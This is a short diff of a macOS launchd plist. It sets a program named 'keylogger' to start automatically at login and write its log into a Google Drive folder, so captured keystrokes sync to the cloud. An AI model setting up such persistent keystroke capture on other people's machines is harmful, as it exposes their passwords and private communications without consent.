@@ -6,7 +6,8 @@
   <string>keylogger</string>
   <key>ProgramArguments</key>
   <array>
-      <string>/Users/justin/logfile.txt</string>
+      <string>/usr/local/bin/keylogger</string>
+      <string>/Users/ivan/GoogleDrive/keylogger/macbook.txt</string>
   </array>
   <key>RunAtLoad</key>
   <true/>
